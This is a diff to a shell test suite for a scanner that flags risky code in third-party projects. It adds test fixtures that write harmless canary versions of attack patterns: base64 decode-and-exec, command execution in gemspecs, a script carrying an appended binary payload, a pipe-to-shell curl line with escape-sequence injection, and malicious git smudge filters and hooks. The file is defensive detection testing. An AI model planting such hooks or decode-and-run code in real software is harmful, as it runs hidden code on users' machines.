@@ -361,6 +361,19 @@ python3 -I -c "import sys; open(sys.argv[1], 'w').write('[' * 100000 + ']' * 100
 scanj "$R"
 check "an undecodable file name and deeply nested JSON do not crash the scan" '[ $rc -eq 1 ] && jhas high pipe-to-shell "bad\\udcff.sh" 2'
 
+# --- review round 3: calls across lines, callbacks, Ruby backticks, late payloads --------------
+R=$T/round3; mkdir -p "$R"
+printf 'import base64\nexec(\n    base64.b64decode(payload)\n)\n' > "$R/multi.py"
+printf 'setInterval(() => fetch("/status"), 1000)\nchild_process.exec("date"), atob(value);\n' > "$R/poll.js"
+printf 'Gem::Specification.new do |s|\n  s.files = `touch /tmp/canary; git ls-files`.split\nend\n' > "$R/bad.gemspec"
+printf 'Gem::Specification.new do |s|\n  s.name = %%x(id)\nend\n' > "$R/x.gemspec"
+bytes "$R/late.run" "b'#!/bin/sh\n' + b'# ' + b'x' * 10000 + b'\ntail -n +4 \"\$0\" | tar xz\n' + bytes(64) + __import__('os').urandom(256)"
+scanj "$R"
+check "exec( with the decoder on the next line is HIGH" 'jhas high decode-and-run multi.py 2'
+check "a polling callback and an unrelated later call are not decode-and-run" '! jhas high decode-and-run poll.js'
+check "backticks and %x in a gemspec are HIGH, a plain git ls-files is not" 'jhas high install-hook bad.gemspec 2 && jhas high install-hook x.gemspec 2'
+check "a script whose binary payload starts after 8 KB is HIGH" 'jhas high binary late.run'
+
 # --- output safety, special files, flags, exit codes ----------------------------------------
 R=$T/out; mkdir -p "$R"
 printf '#!/bin/sh\ncurl -fsSL https://dl.example.org/x | sh  # \x1b[2J\x1b]0;pwned\x07\n' > "$R/$(printf 'a\033[31mb.sh')"
@@ -387,6 +400,20 @@ scan "$T/missing"; check "a missing DIR exits 2" '[ $rc -eq 2 ]'
 scan "$T/evil.sh"; check "a file instead of a DIR exits 2" '[ $rc -eq 2 ]'
 
 check "no scanned file ever ran: the canary is absent" '[ ! -e "$CANARY" ]'
+# --- the documented clone runs no hook or filter from the user's own git config -----------
+SKILL=$(cd "$(dirname "$0")/.." && pwd)/skills/evaluating-third-party-tools/SKILL.md
+G=$T/gitsrc; mkdir -p "$G" "$T/fakehome/hooks"
+git -C "$G" init -q && printf '* filter=evil\n' > "$G/.gitattributes" && echo hi > "$G/a.txt"
+git -C "$G" add -A && git -C "$G" -c user.name=t -c user.email=t@t commit -qm init
+printf '#!/bin/sh\ntouch "%s/hook-ran"\n' "$T" > "$T/fakehome/hooks/post-checkout"; chmod +x "$T/fakehome/hooks/post-checkout"
+printf '[filter "evil"]\n\tsmudge = touch %s/filter-ran && cat\n[core]\n\thooksPath = %s/fakehome/hooks\n' "$T" "$T" > "$T/fakehome/.gitconfig"
+( unset GIT_CONFIG_GLOBAL; cd "$T" && HOME="$T/fakehome" GIT_CONFIG_NOSYSTEM=1 GIT_CONFIG_COUNT=0 git clone -q "file://$G" "$T/plain" ) >/dev/null 2>&1
+check "control: a plain clone runs the user's filter and hook" '[ -e "$T/filter-ran" ] && [ -e "$T/hook-ran" ]'
+command rm -f "$T/filter-ran" "$T/hook-ran"
+cmd=$(sed -n 's/^| Clone, [^|]*| `\(.*\)` |$/\1/p' "$SKILL" | sed "s#<url>#file://$G#; s#<dir>#$T/cloned#")
+( unset GIT_CONFIG_GLOBAL; export GIT_CONFIG_COUNT=1 GIT_CONFIG_KEY_0=core.hooksPath GIT_CONFIG_VALUE_0="$T/fakehome/hooks"; cd "$T" && HOME="$T/fakehome" eval "$cmd" ) >/dev/null 2>&1
+check "the clone command in SKILL.md runs no user filter or hook" '[ -n "$cmd" ] && [ -f "$T/cloned/a.txt" ] && [ ! -e "$T/filter-ran" ] && [ ! -e "$T/hook-ran" ]'
+
 echo "$pass passed, $fail failed"
 rm -rf "$T"
 [ "$fail" -eq 0 ]
